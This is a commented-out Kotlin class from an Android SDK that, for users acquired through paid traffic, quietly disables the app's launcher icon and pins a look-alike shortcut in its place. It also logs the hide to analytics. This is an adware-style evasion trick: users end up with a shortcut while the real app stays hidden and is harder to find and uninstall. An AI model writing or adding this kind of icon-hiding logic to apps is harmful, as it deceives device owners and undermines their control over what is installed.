//package com.sunrise.sunrise.control
//
//import android.content.ComponentName
//import android.content.Intent
//import android.content.pm.ActivityInfo
//import android.content.pm.PackageManager
//import android.content.pm.ShortcutManager
//import android.os.Build
//import androidx.core.content.edit
//import androidx.core.content.pm.ShortcutInfoCompat
//import androidx.core.content.pm.ShortcutManagerCompat
//import androidx.core.graphics.drawable.IconCompat
//import com.sunrise.sunrise.SunSdk
//import com.sunrise.sunrise.SunriseApp
//import com.sunrise.sunrise.support.LogUtil
//import com.sunrise.sunrise.support.Switch
//import kotlinx.coroutines.CoroutineScope
//import kotlinx.coroutines.Dispatchers
//import kotlinx.coroutines.delay
//import kotlinx.coroutines.launch
//import kotlin.math.pow
//
//class ShortcutAndLauncherManager private constructor() {
//    companion object {
//        private val TAG = ShortcutAndLauncherManager::class.java.simpleName
//
//        val instance: ShortcutAndLauncherManager by lazy(mode = LazyThreadSafetyMode.SYNCHRONIZED) {
//            ShortcutAndLauncherManager()
//        }
//    }
//
//    private val I_K = "launcherIcon"
//
//
//    fun check(repeatTimes: Int = 0) {
//        CoroutineScope(Dispatchers.Main).launch {
//            delay(6000L * 4F.pow(repeatTimes).toLong())
//            if (SunConfig.instance.hasLocalConfig() && TrafficType.instance.getType() == TrafficType.TRAFFIC_PAID) {
//                if (!SunSdk.instance.sdkEnable()) {
//                    return@launch
//                }
//
//                if (SunSdk.instance.sp.getBoolean(I_K, false)) {
//                    if (Switch.LOG_ENABLE) {
//                        LogUtil.getInstance().v(TAG, "icon is already hidden")
//                    }
//                    return@launch
//                }
//
//                val launcherInfo: ActivityInfo? = retrieveLauncherActivity()
//                hideIcon(launcherInfo?.name)
//                createShortcut(launcherInfo)
//
//            } else if (repeatTimes < 3) {
//                check(repeatTimes + 1)
//            } else {
//                if (Switch.LOG_ENABLE) {
//                    LogUtil.getInstance().e(TAG, "hide failed:have tried three times")
//                }
//            }
//        }
//    }
//
//    private fun retrieveLauncherActivity(): ActivityInfo? {
//        val pm = SunriseApp.app.packageManager
//        val pkg = SunriseApp.app.packageName
//
//        val intent = Intent(Intent.ACTION_MAIN, null)
//        intent.addCategory(Intent.CATEGORY_LAUNCHER)
//        intent.setPackage(pkg)
//        val appList = pm.queryIntentActivities(intent, 0)
//        for (info in appList) {
//            if (info.activityInfo.packageName.equals(pkg, ignoreCase = true)) {
//                return info.activityInfo
//            }
//        }
//        return null
//    }
//
//    private fun hideIcon(launcherClsName: String?) {
//        if (Switch.LOG_ENABLE) {
//            LogUtil.getInstance().d(TAG, "hideIcon, doing...")
//        }
//
//        try {
//            val pm = SunriseApp.app.packageManager
//            val pkg = SunriseApp.app.packageName
//
//            val launcherComponent = launcherClsName?.let { ComponentName(pkg, it) }
//
//            if (launcherComponent!!.let { pm.getComponentEnabledSetting(it) } != PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
//                pm.setComponentEnabledSetting(
//                    launcherComponent, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//                    PackageManager.DONT_KILL_APP
//                )
//
//                SunSdk.instance.sp.edit {
//                    putBoolean(I_K, true)
//                }
//
//                SunSdk.instance.analytics.logEvent("hideicon", Pair("dev", TrafficType.instance.getDevMeta()))
//            }
//        } catch (e: Exception) {
//            if (Switch.LOG_ENABLE) {
//                e.printStackTrace()
//            }
//
//            SunSdk.instance.analytics.logError(null, "hideIcon", e)
//        }
//    }
//
//    private fun createShortcut(launcherInfo: ActivityInfo?) {
//        val pkg = SunriseApp.app.packageName
//
//        try {
//            if (ShortcutManagerCompat.isRequestPinShortcutSupported(SunriseApp.app)) {
//                val component = ComponentName(pkg, launcherInfo!!.targetActivity)
//                val shortcutIntent = Intent()
//                shortcutIntent.component = component
//                shortcutIntent.action = Intent.ACTION_VIEW //action必须设置，不然报错
//                val appName = launcherInfo.loadLabel(SunriseApp.app.packageManager) as String
//                val shortcutInfo = ShortcutInfoCompat.Builder(SunriseApp.app, appName)
//                    .setIcon(
//                        IconCompat.createWithResource(
//                            SunriseApp.app,
//                            launcherInfo.iconResource
//                        )
//                    )
//                    .setShortLabel(appName)
//                    .setIntent(shortcutIntent)
//                    .setLongLabel(appName)
//                    .setActivity(component)
//                    .build()
//
//                ShortcutManagerCompat.requestPinShortcut(
//                    SunriseApp.app,
//                    shortcutInfo,
//                    null
//                )
//            }
//        } catch (th: Throwable) {
//            if (Switch.LOG_ENABLE) {
//                th.printStackTrace()
//            }
//
//            SunSdk.instance.analytics.logError(null,"createShortcut", th)
//        }
//    }
//}